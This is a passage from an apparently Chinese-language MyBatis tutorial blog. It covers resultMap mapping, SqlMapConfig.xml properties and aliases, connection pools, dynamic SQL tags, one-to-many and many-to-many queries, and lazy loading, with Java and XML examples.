alt="在这里插入图片描述"><br>为什么名称会有值呢？</p><p>因为：mysql 在 windows 系统中不区分大小写！</p><p><strong>应对措施</strong>：</p><ol><li>使用别名查询：</li><li>使用resultMap 结果类型封装</li></ol><p><strong>1、使用别名查询</strong>：</p><p>即给实体类的属性名起对应数据的字段值别名</p><p><img src="http://img-blog.csdnimg.cn/20201107113557449.png#pic_center" alt="在这里插入图片描述"></p><p><strong>2、resultMap 结果类型</strong>：</p><p>resultMap 标签可以建立查询的列名和实体类的属性名称不一致时建立对应关系。从而实现封装。</p><p>在 select 标签中使用 resultMap 属性指定引用即可。同时 resultMap 可以实现将查询结果映射为复杂类型的 pojo，比如在查询结果映射对象中包括 pojo 和 list 实现一对一查询和一对多查询。</p><p><strong>实现步骤</strong>：</p><p> 1、定义 resultMap：</p><pre><code class="xml"> &lt;!-- 建立 Use实体和数据库表的对应关系    type属性：指定实体类的全限定类名    id 属性：给定一个唯一标识，是给查询 select 标签引用用的    --&gt;    &lt;resultMap type=&quot;com.smk.domain.User2&quot; id=&quot;userMap&quot;&gt;        &lt;id column=&quot;id&quot; property=&quot;userId&quot;/&gt;        &lt;result column=&quot;username&quot; property=&quot;userName&quot;/&gt;        &lt;result column=&quot;sex&quot; property=&quot;userSex&quot;/&gt;        &lt;result column=&quot;address&quot; property=&quot;userAddress&quot;/&gt;        &lt;result column=&quot;birthday&quot; property=&quot;userBirthday&quot;/&gt;    &lt;/resultMap&gt;</code></pre><ul><li><p>id 标签：用于指定主键字段</p></li><li><p>result 标签：用于指定非主键字段</p></li><li><p>column 属性：用于指定数据库列名</p></li><li><p>property 属性：用于指定实体类属性名称</p><p>2、映射配置：</p></li></ul><pre><code class="java">    &lt;!-- 配置查询所有操作 --&gt;    &lt;select id=&quot;findAll&quot; resultMap=&quot;userMap&quot;&gt;       select * from user    &lt;/select&gt;</code></pre><p>3、测试结果：</p><p><img src="http://img-blog.csdnimg.cn/20201106210506605.png#pic_center" alt="在这里插入图片描述"><br>可以看到查询正常了。</p><h4 id="六、SqlMapConfig-xml配置文件"><a href="#六、SqlMapConfig-xml配置文件" class="headerlink" title="六、SqlMapConfig.xml配置文件"></a>六、SqlMapConfig.xml配置文件</h4><p><strong>1、properties（属性）</strong>：</p><p>在使用 properties 标签配置时，我们可以采用两种方式指定属性配置。</p><p>1、第一种  ：</p><pre><code class="xml">    &lt;properties&gt;        &lt;property name=&quot;jdbc.driver&quot; value=&quot;com.mysql.jdbc.Driver&quot;/&gt;        &lt;property name=&quot;jdbc.url&quot;                  value=&quot;jdbc:mysql://localhost:3306/my_batis?useUnicode=true&amp;amp;characterEncoding=utf8&quot;/&gt;        &lt;property name=&quot;jdbc.username&quot; value=&quot;root&quot;/&gt;        &lt;property name=&quot;jdbc.password&quot; value=&quot;&quot;/&gt;    &lt;/properties&gt;</code></pre><p>2、第二种   ：</p><p> 在 classpath (类路径，resources目录即为根 类路径) 下定义 db.properties 文件<br><img src="http://img-blog.csdnimg.cn/20201107144401778.png" alt="在这里插入图片描述"></p><p>db.properties 文件内容：</p><pre><code class="java">jdbc.driver=com.mysql.jdbc.Driverjdbc.url=jdbc:mysql://localhost:3306/my_batis?useUnicode=true&amp;characterEncoding=utf8jdbc.username=rootjdbc.password=</code></pre><p>注意：db.properties 文件中 数据库连接，指定编码格式不能用 <code>&amp;amp;</code> 需改为 <code>&amp;</code></p><p>配置信息：</p><pre><code class="xml"> &lt;properties resource=&quot;db.properties&quot;&gt; &lt;/properties&gt;</code></pre><p>此时我们的 dataSource 标签就变成了引用上面的配置：</p><pre><code class="xml">      &lt;!--配置数据源/连接池--&gt;    &lt;dataSource type=&quot;POOLED&quot;&gt;        &lt;property name=&quot;driver&quot; value=&quot;$&#123;jdbc.driver&#125;&quot;/&gt;        &lt;property name=&quot;url&quot; value=&quot;$&#123;jdbc.url&#125;&quot;/&gt;        &lt;property name=&quot;username&quot; value=&quot;&#123;$jdbc.username&#125;&quot;/&gt;        &lt;property name=&quot;password&quot; value=&quot;$&#123;jdbc.password&#125;&quot;/&gt;    &lt;/dataSource&gt;</code></pre><p><strong>2、typeAliases（类型别名）</strong>：、</p><p>自定义别名：</p><p>在 SqlMapConfig.xml 中配置：</p><pre><code class="xml">&lt;typeAliases&gt;&lt;!-- 单个别名定义 --&gt;&lt;typeAlias type=&quot;com.itheima.domain.User&quot; alias=&quot;user&quot;/&gt;&lt;!-- 批量别名定义，扫描整个包下的类，别名为类名（首字母大写或小写都可以）--&gt;&lt;package name=&quot;com.smk.domain&quot;/&gt;&lt;package name=&quot;其它包&quot;/&gt;&lt;/typeAliases&gt;</code></pre><p><strong>3、mappers（映射器）</strong>：</p><p><code>&lt;mapper resource=&quot; &quot;/&gt;</code> 使用相对于类路径的资源，如：</p><pre><code class="java">&lt;mapper resource=&quot;com/smk/dao/IUserDao.xml&quot; /&gt;</code></pre><p><code>&lt;mapper class=&quot; &quot;/&gt;</code> 使用 mapper 接口类路径，如：</p><pre><code class="java">&lt;mapper class=&quot;com.smk.dao.UserDao&quot;/&gt;</code></pre><p>package 标签是用于指定dao接口所在的<strong>包</strong>，当指定了之后，就不需要再写 mapper标签以及 resource 或者 class 了</p><p>在 SqlMapConfig.xml 中配置：</p><p><code> &lt;package name=&quot;&quot;/&gt;</code> 注册指定包下的所有 mapper 接口，如：</p><pre><code class="java">&lt;mappers&gt;     &lt;package name=&quot;com.smk.dao&quot;/&gt;&lt;/mappers&gt;</code></pre><p>注意：此种方法要求 mapper 接口名称和 mapper 映射文件名称相同，且放在同一个目录中。<br><img src="http://img-blog.csdnimg.cn/2020110715394491.png" alt="在这里插入图片描述"></p><h4 id="七、Mybatis-连接池"><a href="#七、Mybatis-连接池" class="headerlink" title="七、Mybatis 连接池"></a>七、Mybatis 连接池</h4><h5 id="1、Mybatis-的连接池技术："><a href="#1、Mybatis-的连接池技术：" class="headerlink" title="1、Mybatis 的连接池技术："></a>1、Mybatis 的连接池技术：</h5><p> 在 web 开发中，常使用连接池技术来减少我们获取连接所消耗的时间；在 Mybatis 中也有连接池技术，但是它采用的是自己的连接池技术。在 Mybatis 的 SqlMapConfig.xml 配置文件中，通过 <code>&lt;dataSource type = &quot;&quot;&gt;</code> 来实现 Mybatis 中连接池的配置。</p><p><strong>1.1、Mybatis 连接池的分类</strong>：</p><p>mybatis连接池提供了3种方式的配置：</p><p>配置的位置：</p><ul><li>主配置文件SqlMapConfig.xml中的dataSource标签，type属性就是表示采用何种连接池方式。</li></ul><p>type属性的取值：</p><ul><li>POOLED     使用连接池的数据源</li><li>UNPOOLED 不使用连接池的数据源</li><li>JNDI     使用 JNDI 实现的数据源</li></ul><p>具体结构如下：<br><img src="http://img-blog.csdnimg.cn/20201108181835759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>相应地，MyBatis 内部分别定义了实现了 java.sql.DataSource 接口的 UnpooledDataSource，PooledDataSource 类来表示 UNPOOLED、POOLED 类型的数据源。</p><p><strong>1.2、Mybatis 中数据源的配置</strong>：</p><p>在SqlMapConfig.xml 进行配置</p><pre><code class="xml">&lt;dataSource type=&quot;POOLED&quot;&gt;    &lt;property name=&quot;driver&quot; value=&quot;$&#123;jdbc.driver&#125;&quot;/&gt;    &lt;property name=&quot;url&quot; value=&quot;$&#123;jdbc.url&#125;&quot;/&gt;    &lt;property name=&quot;username&quot; value=&quot;$&#123;jdbc.username&#125;&quot;/&gt;    &lt;property name=&quot;password&quot; value=&quot;$&#123;jdbc.password&#125;&quot;/&gt;&lt;/dataSource&gt;</code></pre><p>Mybatis 在初始化时，根据<code>&lt;dataSource&gt;</code>的 type 属性来创建相应类型的的数据源 DataSource，即：</p><ul><li>type=” POOLED “：MyBatis 会创建 PooledDataSource 实例。</li><li>type=” UNPOOLED “： MyBatis 会创建 UnpooledDataSource 实例。</li><li>type=” JNDI “：MyBatis 会从 JNDI 服务上查找 DataSource 实例，然后返回使用。</li></ul><h4 id="八、Mybatis的动态SQL语句"><a href="#八、Mybatis的动态SQL语句" class="headerlink" title="八、Mybatis的动态SQL语句"></a>八、Mybatis的动态SQL语句</h4><p><strong>1、动态sql之<code>&lt;if&gt;</code>标签</strong>：</p><ul><li>根据实体类的不同取值，使用不同的 SQL 语句来进行查询。比如在 id 如果不为空时可以根据 id 查询，如果 username 不为空时还要加入用户名作为条件。这种情况在我们的多条件组合查询中经常会碰到。</li></ul><p>1、持久层 Dao 接口：</p><pre><code class="java">    //根据用户信息，查询用户列表    List&lt;User&gt; findByUser(User user);</code></pre><p>2、持久层 Dao 映射配置：</p><pre><code class="java">    &lt;select id=&quot;findByUser&quot; resultMap=&quot;userMap&quot; parameterType=&quot;user&quot;&gt;        select * from user where 1=1        &lt;if test=&quot;userName!=null and userName != &#39;&#39; &quot;&gt;            and username like #&#123;userName&#125;        &lt;/if&gt;        &lt;if test=&quot;userAddress != null&quot;&gt;            or address like #&#123;userAddress&#125;        &lt;/if&gt;    &lt;/select&gt;</code></pre><p>注：where 1=1 是为了避免 where 关键字后面的第一个词直接就是 “ and “ 而导致语法错误。</p><p>3、 测试：</p><pre><code class="java"> @Test    public void testFindByUser() &#123;        User u = new User();        u.setUserName(&quot;%王%&quot;);        u.setUserAddress(&quot;%顺义%&quot;);        //6.执行操作        List&lt;User&gt; users = userDao.findByUser(u);        for (User user : users) &#123;            System.out.println(user);        &#125;    &#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201109233820528.png#pic_center" alt="在这里插入图片描述"><br>可以看到，带 “王” 的用户和地址带 “顺义” 的用户信息全查询出来了。</p><p><strong>2、动态sql 之 <code>&lt;where&gt;</code>标签</strong>： </p><p>为了简化上面 where 1=1 的条件拼装，可以采用 <code>&lt;where&gt;</code> 标签来简化开发。</p><p>1、持久层 Dao 映射配置:</p><pre><code class="java">    &lt;select id=&quot;findByUser&quot; resultMap=&quot;userMap&quot; parameterType=&quot;user&quot;&gt;        select * from user        &lt;where&gt;            &lt;if test=&quot;userName!=null and userName != &#39;&#39; &quot;&gt;                and username like #&#123;userName&#125;            &lt;/if&gt;            &lt;if test=&quot;userAddress != null&quot;&gt;                or address like #&#123;userAddress&#125;            &lt;/if&gt;        &lt;/where&gt;    &lt;/select&gt;</code></pre><p><strong>3、动态标签之<code>&lt;foreach&gt;</code>标签</strong>：</p><p>在进行范围查询时，就要将一个集合中的值，作为参数动态添加进来。<br>这样将如何进行参数的传递？</p><p>1、在 QueryVo 中加入一个 List 集合用于封装参数：</p><pre><code class="java">public class QueryVo &#123;    private User user;    private List&lt;Integer&gt; ids;    public List&lt;Integer&gt; getIds() &#123;        return ids;    &#125;    public void setIds(List&lt;Integer&gt; ids) &#123;        this.ids = ids;    &#125;    public User getUser() &#123;        return user;    &#125;    public void setUser(User user) &#123;        this.user = user;    &#125;&#125;</code></pre><p>2、持久层 Dao 接口：</p><pre><code class="java">    // 根据 id 集合查询用户    List&lt;User&gt; findInIds(QueryVo vo);</code></pre><p>3、持久层 Dao 映射配置：</p><pre><code class="java">    &lt;select id=&quot;findInIds&quot; resultMap=&quot;userMap&quot; parameterType=&quot;queryVo&quot;&gt;        select * from user        &lt;where&gt;            &lt;if test=&#39;ids !=null and ids.size&gt;0&#39;&gt;                &lt;foreach collection=&quot;ids&quot; open=&quot;id in (&quot; close=&quot;)&quot; item=&quot;id&quot; separator=&quot;,&quot;&gt;                    #&#123;id&#125;                &lt;/foreach&gt;            &lt;/if&gt;        &lt;/where&gt;    &lt;/select&gt;</code></pre><p>SQL 语句：</p><ul><li>select 字段 from user where id in (?)</li></ul><p><code>&lt;foreach&gt;</code> 标签用于遍历集合，它的属性：</p><ul><li>collection:代表要遍历的集合元素，注意编写时不要写#{}</li><li>open：代表语句的开始部分</li><li>close：代表结束部分</li></ul><p>4、 测试：</p><pre><code class="java">    @Test    public void testFindInIds() &#123;        QueryVo vo = new QueryVo();        List&lt;Integer&gt; ids = new ArrayList&lt;Integer&gt;();        ids.add(41);        ids.add(42);        ids.add(43);        ids.add(46);        ids.add(57);        vo.setIds(ids);        //6.执行操作        List&lt;User&gt; users = userDao.findInIds(vo);        for (User user : users) &#123;            System.out.println(user);        &#125;    &#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201110204140134.png#pic_center" alt="在这里插入图片描述"></p><p><strong>4、Mybatis 中简化编写的 sql 片段</strong>：</p><p>Sql 中可将重复的 sql语句 提取出来，使用时用 include 引用即可，最终达到 sql 重用的目的。</p><p>1、定义代码片段：</p><pre><code class="xml">    &lt;!-- 抽取重复的语句代码片段 --&gt;    &lt;sql id=&quot;defaultSql&quot;&gt;        select * from user    &lt;/sql&gt;</code></pre><p>2、引用代码片段：</p><pre><code class="xml">    &lt;!-- 配置查询所有操作 --&gt;    &lt;select id=&quot;findAll&quot; resultType=&quot;user&quot;&gt;        &lt;include refid=&quot;defaultSql&quot;&gt;&lt;/include&gt;    &lt;/select&gt;    &lt;!-- 根据 id 查询 --&gt;    &lt;select id=&quot;findById&quot; resultType=&quot;UsEr&quot; parameterType=&quot;int&quot;&gt;        &lt;include refid=&quot;defaultSql&quot;&gt;&lt;/include&gt;        where id = #&#123;uid&#125;    &lt;/select&gt;</code></pre><h4 id="九、Mybatis多表查询一对一（多对一）"><a href="#九、Mybatis多表查询一对一（多对一）" class="headerlink" title="九、Mybatis多表查询一对一（多对一）"></a>九、Mybatis多表查询一对一（多对一）</h4><p>**1、一对一查询(多对一)**：</p><p>以最为简单的用户和账户的模型来分析 Mybatis 多表关系。用户为 User 表，账户为Account表。<br>一个用户（User）可以有一个或多个账户（Account）。</p><p><strong>需求</strong>：</p><p>查询所有账户信息，关联查询下单用户信息（只要用户名和地址）。</p><p><strong>注意</strong>：</p><p>因为一个账户信息只能供某一个用户使用，所以从查询账户信息出发，关联查询用户信息为一对一查询。如果从用户信息出发，查询用户下的账户信息则为一对多查询，因为一个用户可以有多个账户。</p><p><strong>方式一</strong>：</p><p>1、定义账户信息的实体类：</p><pre><code class="java">public class Account implements Serializable &#123;    private Integer id;    private Integer uid;    private Double money;    public Integer getId() &#123;        return id;    &#125;    public void setId(Integer id) &#123;        this.id = id;    &#125;    public Integer getUid() &#123;        return uid;    &#125;    public void setUid(Integer uid) &#123;        this.uid = uid;    &#125;    public Double getMoney() &#123;        return money;    &#125;    public void setMoney(Double money) &#123;        this.money = money;    &#125;    @Override    public String toString() &#123;        return &quot;Account&#123;&quot; +                &quot;id=&quot; + id +                &quot;, uid=&quot; + uid +                &quot;, money=&quot; + money +                &#39;&#125;&#39;;    &#125;&#125;</code></pre><p>2、定义 AccountUser 类：</p><p>为了能够封装上面 SQL 语句的查询结果，定义 AccountCustomer 类中要包含账户信息同时还要包含用户信息，所以在定义 AccountUser 类时可以继承 User 类。</p><pre><code class="java">public class AccountUser extends Account implements Serializable &#123;    private String username;    private String address;    public String getUsername() &#123;        return username;    &#125;    public void setUsername(String username) &#123;        this.username = username;    &#125;    public String getAddress() &#123;        return address;    &#125;    public void setAddress(String address) &#123;        this.address = address;    &#125;    @Override    public String toString() &#123;        return super.toString() + &quot;      AccountUser&#123;&quot; +                &quot;username=&#39;&quot; + username + &#39;\&#39;&#39; +                &quot;, address=&#39;&quot; + address + &#39;\&#39;&#39; +                &#39;&#125;&#39;;    &#125;&#125;</code></pre><p>3、定义持久层 Dao 接口：</p><pre><code class="java">    /**     * 查询所有用户，带有用户名和地址信息     * @return     */    List&lt;AccountUser&gt; findAllAccount();</code></pre><p>4、定义 IAccountDao.xml 文件中的查询配置信息：</p><pre><code class="xml">    &lt;!--查询所有账户同是包含用户名和地址信息--&gt;    &lt;select id=&quot;findAllAccount&quot; resultType=&quot;accountuser&quot;&gt;      select a.*,u.username,u.address from account a,user u where a.uid =u.id;    &lt;/select&gt;</code></pre><p>5、创建 AccountTest 测试类：</p><pre><code class="java">    @Test    public void testFindAllAccount() &#123;        List&lt;AccountUser&gt; aus = accountDao.findAllAccount();        for (AccountUser au : aus) &#123;            System.out.println(au);        &#125;    &#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201112163952263.png#pic_center" alt="在这里插入图片描述"></p><p>小结：</p><p>定义专门的 po 类作为输出类型，其中定义了 sql 查询结果集所有的字段。此方法较为简单，企业中使用普遍。</p><p>po: (persistant object）持久对象，可以看成是与数据库中的表相映射的java对象。</p><p><strong>方式二</strong>：</p><p>使用 resultMap，定义专门的 resultMap 用于映射一对一查询结果。</p><p>我们可以在 Account 类中加入一个 User 类的对象来代表这个账户是哪个用户的。</p><p>1、在 Account 类中加入 User 类的对象作为 Account 类的一个属性：</p><pre><code class="java">public class Account implements Serializable &#123;    private Integer id;    private Integer uid;    private Double money;    private User user;    public User getUser() &#123;        return user;    &#125;    public void setUser(User user) &#123;        this.user = user;    &#125;    public Integer getId() &#123;        return id;    &#125;    public void setId(Integer id) &#123;        this.id = id;    &#125;    public Integer getUid() &#123;        return uid;    &#125;    public void setUid(Integer uid) &#123;        this.uid = uid;    &#125;    public Double getMoney() &#123;        return money;    &#125;    public void setMoney(Double money) &#123;        this.money = money;    &#125;    @Override    public String toString() &#123;        return &quot;Account&#123;&quot; +                &quot;id=&quot; + id +                &quot;, uid=&quot; + uid +                &quot;, money=&quot; + money +                &#39;&#125;&#39;;    &#125;&#125;</code></pre><p>2、修改 AccountDao 接口中的方法：</p><pre><code class="java">   List&lt;Account&gt; findAllAccount();</code></pre><p>把 AccountUser 改为 Account</p><p>3、重新定义 AccountDao.xml 文件：</p><pre><code class="xml">&lt;!-- 建立对应关系 --&gt;    &lt;resultMap type=&quot;account&quot; id=&quot;accountMap&quot;&gt;        &lt;id column=&quot;aid&quot; property=&quot;id&quot;/&gt;        &lt;result column=&quot;uid&quot; property=&quot;uid&quot;/&gt;        &lt;result column=&quot;money&quot; property=&quot;money&quot;/&gt;        &lt;!-- 它是用于指定 从表 方的引用实体属性的 --&gt;        &lt;association property=&quot;user&quot; javaType=&quot;user&quot;&gt;            &lt;id column=&quot;id&quot; property=&quot;id&quot;/&gt;            &lt;result column=&quot;username&quot; property=&quot;username&quot;/&gt;            &lt;result column=&quot;sex&quot; property=&quot;sex&quot;/&gt;            &lt;result column=&quot;birthday&quot; property=&quot;birthday&quot;/&gt;            &lt;result column=&quot;address&quot; property=&quot;address&quot;/&gt;        &lt;/association&gt;    &lt;/resultMap&gt;    &lt;select id=&quot;findAllAccount&quot; resultMap=&quot;accountMap&quot;&gt;      select u.*,a.id as aid,a.uid,a.money from account a,user u where a.uid =u.id;    &lt;/select&gt;</code></pre><p>注：</p><ul><li>a.id as aid ：这里两个表的字段重复了所以需要起别名。</li><li>javaType=” user “：即指定数据类型为user类，全限定类名或者别名（此处为别名）。</li></ul><p>4、加入测试方法：</p><pre><code class="java">    @Test    public void testFindAllAccount() &#123;        List&lt;Account&gt; accounts = accountDao.findAllAccount();        for (Account account : accounts) &#123;            System.out.println(account);            System.out.println(account.getUser());        &#125;    &#125;</code></pre><p>测试结果：</p><p><img src="http://img-blog.csdnimg.cn/20201112174242274.png#pic_center" alt="在这里插入图片描述"><br><strong>2、 一对多查询</strong>：</p><p>需求：</p><ul><li>查询所有用户信息及用户关联的账户信息。</li></ul><p>分析：</p><ul><li>用户信息和他的账户信息为一对多关系，并且查询过程中如果用户没有账户信息，此时也要将用户信息查询出来，此时应该使用左外连接查询比较合适。</li></ul><p>1、User 类加入 List <code>&lt;Account&gt;</code>：</p><pre><code class="java">public class User implements Serializable &#123;    private Integer Id;    private String username;    private String Address;    private String Sex;    private Date Birthday;    private List&lt;Account&gt; accounts;    public List&lt;Account&gt; getAccounts() &#123;        return accounts;    &#125;    public void setAccounts(List&lt;Account&gt; accounts) &#123;        this.accounts = accounts;    &#125;    public Integer getId() &#123;        return Id;    &#125;    public void setId(Integer Id) &#123;        this.Id = Id;    &#125;    public String getUsername() &#123;        return username;    &#125;    public void setUsername(String username) &#123;        this.username = username;    &#125;    public String getAddress() &#123;        return Address;    &#125;    public void setAddress(String address) &#123;        Address = address;    &#125;    public String getSex() &#123;        return Sex;    &#125;    public void setSex(String sex) &#123;        Sex = sex;    &#125;    public Date getBirthday() &#123;        return Birthday;    &#125;    public void setBirthday(Date birthday) &#123;        Birthday = birthday;    &#125;    @Override    public String toString() &#123;        return &quot;User&#123;&quot; +                &quot;Id=&quot; + Id +                &quot;, username=&#39;&quot; + username + &#39;\&#39;&#39; +                &quot;, Address=&#39;&quot; + Address + &#39;\&#39;&#39; +                &quot;, Sex=&#39;&quot; + Sex + &#39;\&#39;&#39; +                &quot;, Birthday=&quot; + Birthday +                &#39;&#125;&#39;;    &#125;&#125;</code></pre><p>2、 Dao 接口中加入查询方法：</p><pre><code class="java">    List&lt;User&gt; findAll();</code></pre><p>3、Dao 映射文件配置：</p><pre><code class="xml">    &lt;resultMap type=&quot;user&quot; id=&quot;userMap&quot;&gt;        &lt;id column=&quot;id&quot; property=&quot;id&quot;&gt;&lt;/id&gt;        &lt;result column=&quot;username&quot; property=&quot;username&quot;/&gt;        &lt;result column=&quot;address&quot; property=&quot;address&quot;/&gt;        &lt;result column=&quot;sex&quot; property=&quot;sex&quot;/&gt;        &lt;result column=&quot;birthday&quot; property=&quot;birthday&quot;/&gt;        &lt;!-- collection 是用于建立一对多中集合属性的对应关系        ofType 用于指定集合元素的数据类型        --&gt;        &lt;collection property=&quot;accounts&quot; ofType=&quot;account&quot;&gt;            &lt;id column=&quot;aid&quot; property=&quot;id&quot;/&gt;            &lt;result column=&quot;uid&quot; property=&quot;uid&quot;/&gt;            &lt;result column=&quot;money&quot; property=&quot;money&quot;/&gt;        &lt;/collection&gt;    &lt;/resultMap&gt;    &lt;!--查询所有--&gt;    &lt;select id=&quot;findAll&quot; resultMap=&quot;userMap&quot;&gt;        select u.*,a.id as aid ,a.uid,a.money from user u left outer join account a on u.id =a.uid    &lt;/select&gt;</code></pre><p>注：<br>collection：</p><ul><li>部分定义了用户关联的账户信息。表示关联查询结果集</li></ul><p>property=” accList “ ：</p><ul><li>关联查询的结果集存储在 User 对象的上哪个属性。</li></ul><p>ofType=” account “：</p><ul><li>指定关联查询的结果集中的对象类型即List中的对象类型。此处可以使用别名，也可以使用全限定名。</li></ul><p>4、 测试方法：</p><pre><code class="java">    @Test    public void testFindAll() &#123;        List&lt;User&gt; users = userDao.findAll();        for (User user : users) &#123;            System.out.println(&quot;用户的信息：&quot;);            System.out.println(user);            System.out.println(user.getAccounts());        &#125;    &#125;</code></pre><p>5、运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201114111944114.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h4 id="十、-Mybatis-多表查询——多对多"><a href="#十、-Mybatis-多表查询——多对多" class="headerlink" title="十、 Mybatis 多表查询——多对多"></a>十、 Mybatis 多表查询——多对多</h4><p><strong>1、实现 Role 到 User 多对多</strong>：</p><p>1、编写 Role 实体类：</p><pre><code class="java">public class Role implements Serializable &#123;    private Integer roleId;    private String roleName;    private String roleDesc;    private List&lt;User&gt; users;    public List&lt;User&gt; getUsers() &#123;        return users;    &#125;    public void setUsers(List&lt;User&gt; users) &#123;        this.users = users;    &#125;    public Integer getRoleId() &#123;        return roleId;    &#125;    public void setRoleId(Integer roleId) &#123;        this.roleId = roleId;    &#125;    public String getRoleName() &#123;        return roleName;    &#125;    public void setRoleName(String roleName) &#123;        this.roleName = roleName;    &#125;    public String getRoleDesc() &#123;        return roleDesc;    &#125;    public void setRoleDesc(String roleDesc) &#123;        this.roleDesc = roleDesc;    &#125;    @Override    public String toString() &#123;        return &quot;Role&#123;&quot; +                &quot;roleId=&quot; + roleId +                &quot;, roleName=&#39;&quot; + roleName + &#39;\&#39;&#39; +                &quot;, roleDesc=&#39;&quot; + roleDesc + &#39;\&#39;&#39; +                &#39;&#125;&#39;;    &#125;&#125;</code></pre><p>2、编写 Role 持久层接口：</p><pre><code class="java">    /**     * 查询所有角色     * @return     */    List&lt;Role&gt; findAll();</code></pre><p>3、编写映射文件：</p><pre><code class="xml">&lt;mapper namespace=&quot;com.itheima.dao.IRoleDao&quot;&gt;    &lt;!--定义role表的ResultMap--&gt;    &lt;resultMap id=&quot;roleMap&quot; type=&quot;role&quot;&gt;        &lt;id property=&quot;roleId&quot; column=&quot;rid&quot;&gt;&lt;/id&gt;        &lt;result property=&quot;roleName&quot; column=&quot;role_name&quot;&gt;&lt;/result&gt;        &lt;result property=&quot;roleDesc&quot; column=&quot;role_desc&quot;&gt;&lt;/result&gt;        &lt;collection property=&quot;users&quot; ofType=&quot;user&quot;&gt;            &lt;id column=&quot;id&quot; property=&quot;id&quot;&gt;&lt;/id&gt;            &lt;result column=&quot;username&quot; property=&quot;username&quot;&gt;&lt;/result&gt;            &lt;result column=&quot;address&quot; property=&quot;address&quot;&gt;&lt;/result&gt;            &lt;result column=&quot;sex&quot; property=&quot;sex&quot;&gt;&lt;/result&gt;            &lt;result column=&quot;birthday&quot; property=&quot;birthday&quot;&gt;&lt;/result&gt;        &lt;/collection&gt;    &lt;/resultMap&gt;    &lt;!--查询所有--&gt;    &lt;select id=&quot;findAll&quot; resultMap=&quot;roleMap&quot;&gt;       select u.*,r.id as rid,r.role_name,r.role_desc from role r       left outer join user_role ur on r.id = ur.rid       left outer join user u on u.id = ur.uid    &lt;/select&gt;&lt;/mapper&gt;</code></pre><p>4、测试类：</p><pre><code class="java">    /**     * 测试查询所有     */    @Test    public void testFindAll() &#123;        List&lt;Role&gt; roles = roleDao.findAll();        for (Role role : roles) &#123;            System.out.println(&quot;---每个角色的信息----&quot;);            System.out.println(role);            System.out.println(role.getUsers());        &#125;    &#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201115145411115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><strong>2、实现 User 到 Role 的多对多</strong>：</p><p>大体步骤和上面同理，其中sql语句需改为：</p><pre><code class="sql"> select u.*,r.id as rid,r.role_name,r.role_desc from user u       left outer join user_role ur on u.id = ur.rid       left outer join role r on r.id = ur.uid</code></pre><h4 id="十一、-Mybatis-延迟加载策略"><a href="#十一、-Mybatis-延迟加载策略" class="headerlink" title="十一、 Mybatis 延迟加载策略"></a>十一、 Mybatis 延迟加载策略</h4><p>通过前面的学习，我们已经掌握了 Mybatis 中一对一，一对多，多对多关系的配置及实现，可以实现对象的关联查询。实际开发过程中很多时候我们并不需要总是在加载用户信息时就一定要加载他的账户信息。此时就是我们所说的延迟加载。</p><p><strong>1、何为延迟加载</strong>?</p><p> 就是在需要用到数据时才进行加载，不需要用到数据时就不加载数据。延迟加载也称懒加载。</p><p> 好处：</p><ul><li>先从单表查询，需要时再从关联表去关联查询，大大提高数据库性能，因为查询单表要比关联查询多张表速度要快。</li></ul><p>坏处：</p><ul><li>因为只有当需要用到数据时，才会进行数据库查询，这样在大批量数据查询时，因为查询工作也要消耗时间，所以可能造成用户等待时间变长，造成用户体验下降。</li></ul><p><strong>2、使用 assocation 实现延迟加载</strong>：</p><p>需求：</p><ul><li>查询账户(Account) 信息并且关联查询用户(User) 信息。如果先查询账户(Account) 信息即可满足要求，当我们需要查询用户(User) 信息时再查询用户(User) 信息。把对用户(User) 信息的按需去查询就是延迟加载。</li></ul><p>1、DAO 接口：</p><pre><code class="java">  List&lt;Account&gt; findAll();</code></pre><p>2、持久层映射文件：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE mapper        PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;        &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;com.itheima.dao.IAccountDao&quot;&gt;    &lt;!-- 建立对应关系 --&gt;    &lt;resultMap type=&quot;account&quot; id=&quot;accountMap&quot;&gt;        &lt;id column=&quot;id&quot; property=&quot;id&quot;/&gt;        &lt;result column=&quot;uid&quot; property=&quot;uid&quot;/&gt;        &lt;result column=&quot;money&quot; property=&quot;money&quot;/&gt;        &lt;!-- 它是用于指定从表方的引用实体属性的 --&gt;        &lt;association property=&quot;user&quot; javaType=&quot;user&quot;                     select=&quot;com.itheima.dao.IUserDao.findById&quot;                     column=&quot;uid&quot;&gt;        &lt;/association&gt;    &lt;/resultMap&gt;    &lt;select id=&quot;findAll&quot; resultMap=&quot;accountMap&quot;&gt;      select * from account    &lt;/select&gt;&lt;/mapper&gt;</code></pre><p>其中：</p><ul><li>select： 填写我们要调用的 select 映射的 id</li><li>column ： 填写我们要传递给 select 映射的参数</li></ul><p>3、User 的持久层接口和映射文件：</p><pre><code class="java">User findById(Integer userId); </code></pre><pre><code class="xml">&lt;!--根据 id 查询--&gt;&lt;select id=&quot;findById&quot; resultType=&quot;user&quot; parameterType=&quot;int&quot; &gt;    select * from user where id = #&#123;uid&#125;&lt;/select&gt;</code></pre><p>4、开启 Mybatis 的延迟加载策略：</p><p>在 SqlMapConfig.xml 中配置</p><pre><code class="xml">    &lt;!--开启延迟加载的支持--&gt;    &lt;settings&gt;        &lt;setting name=&quot;lazyLoadingEnabled&quot; value=&quot;true&quot;/&gt;        &lt;setting 